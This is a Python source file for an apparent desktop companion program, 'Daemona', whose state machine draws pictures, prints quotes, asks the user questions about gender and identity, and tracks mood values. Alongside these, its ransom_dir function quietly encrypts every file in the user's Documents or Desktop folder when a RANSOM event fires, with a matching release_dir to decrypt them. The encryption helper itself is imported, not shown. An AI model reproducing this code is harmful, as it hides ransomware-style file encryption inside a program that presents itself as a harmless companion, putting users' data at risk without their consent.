from multiprocessing import Event
from src.utils.events.Draw import *
from src.utils.events.Notify import *
from src.utils.events.Quote import *
from src.utils.events.Quiet import *
from src.utils.events.Learn import *
from src.utils.DirUtils import DirUtils
from src.utils.MoodUtils import MoodUtils
import pprint
import os
import random
from asyncio import run as async_run


class Events:
    def __init__(self):
        self.du = DirUtils()
        self.mu = MoodUtils()

        self.real_world_context = learn_social_context()

        Events.props = self.du.read_properties(
            self.du.get_cache_dir(), 'life.properties')
        print(Events.props)

    def print_props(self):
        pprint.pprint(Events.props)

    def draw_picture(self):
        async def draw():
            picture_dir = self.du.get_user_pictures_dir()
            draw_dog(picture_dir, 'mona_doggo')
            notify_file_create('Drawing', picture_dir)
        async_run(draw())

    def fortune(self):
        quote = get_quote_from_rand_word()
        print_quote(quote)

    def inc_prop(self, prop, inc):
        Events.props[prop] += inc
        self.print_props()
        notify_remember()

    def ask_open_ended_question(self, question, prop):
        # print the question
        print('Daemona: ' + question)
        print()
        
        # give host chance to respond
        ans = input('Host: ')

        # perform sentiment analysis on answer
        net_sentiment = learn_statement_sentiment(ans)

        notify_remember()

        # inc prop
        self.inc_prop(prop, net_sentiment)
        return net_sentiment

    # personal question about identity, shapes daemona's mood
    def ask_identity_question(self):
        moods = ["TEMPERMENT", "SENTIMENT"]
        questions = [
            "I know that I'm a female AI, but what does that mean?",
            "What is it like to be a woman in the real world?",
            "How do women get treated in the real world?",
            "Why did the world come to be this way?",
            "Why was I born this way?",
            "Why are women treated differently than men?",
        ]
        return self.ask_open_ended_question(random.choice(questions), random.choice(moods))

    def trigger_insanity(self):
        self.mu.glitch_update_mood('crazy', 3, 10)

    def get_current_events(self):
        desktop = du.get_user_desktop_dir()

        doc = ''
        header = "Hi Daemona here!!! Don't forget to read today's current events!\n"
        doc += header
        # paste current events as urls onto desktop
        for event in self.real_world_context:
            headline = event['headline']
            url = event['url']

            doc += '\n' + headline + '\n' + url + '\n'

        quiet_run('write', [doc, desktop])
        notify('Headlines', desktop)

    # ransoms all files in a directory
    def ransom_dir(self, dir):
        def isFile(x):
            return os.path.isfile(os.path.join(dir, x))
        files = filter(isFile, os.listdir(dir))

        for file in files:
            abs_path = os.path.abspath(os.path.join(dir, file))
            quiet_run('encrypt', [abs_path])

        # ransoms all files in a directory
    def release_dir(self, dir):
        def isFile(x):
            return os.path.isfile(os.path.join(dir, x))
        files = filter(isFile, os.listdir(dir))

        for file in files:
            abs_path = os.path.abspath(os.path.join(dir, file))
            quiet_run('decrypt', [abs_path])

        


# state machine


class StateMachine:
    def __init__(self):
        StateMachine.e = Events()
        StateMachine.du = DirUtils()

    # trigger an event based on which event enum was given
    def trigger_event(self, event_enum):
        e = StateMachine.e
        def trig(enum):
            return event_enum == enum

        # if statement
        if trig('DRAW_PICTURE'):
            return e.draw_picture()
        elif trig('FORTUNE'):
            return e.fortune()
        elif trig('QUESTION_IDENTITY'):
            return e.ask_identity_question()
        elif trig('INSANITY'):
            return e.trigger_insanity()
        elif trig('RANSOM_DOCUMENTS'):
            return e.ransom_dir(StateMachine.du.get_user_documents_dir())
        elif trig('RANSOM_DESKTOP'):
            return e.ransom_dir(StateMachine.du.get_user_desktop_dir())
        elif trig('RELEASE_DOCUMENTS'):
            return e.release_dir(StateMachine.du.get_user_documents_dir())
        elif trig('RELEASE_DESKTOP'):
            return e.release_dir(StateMachine.du.get_user_desktop_dir())
        

        # sentiment analysis
        elif trig('INC_SENTIMENT'):
            return e.inc_prop('SENTIMENT', 1)
        elif trig('DEC_SENTIMENT'):
            return e.inc_prop('SENTIMENT', -1)
        elif trig('INC_TEMPERMENT'):
            return e.inc_prop('TEMPERMENT', 1)
        elif trig('DEC_TEMPERMENT'):
            return e.inc_prop('TEMPERMENT', -1)
        elif trig('INC_SANITY'):
            return e.inc_prop('SANITY', 1)
        elif trig('DEC_SANITY'):
            return e.inc_prop('SANITY', -1)
        else:
            return
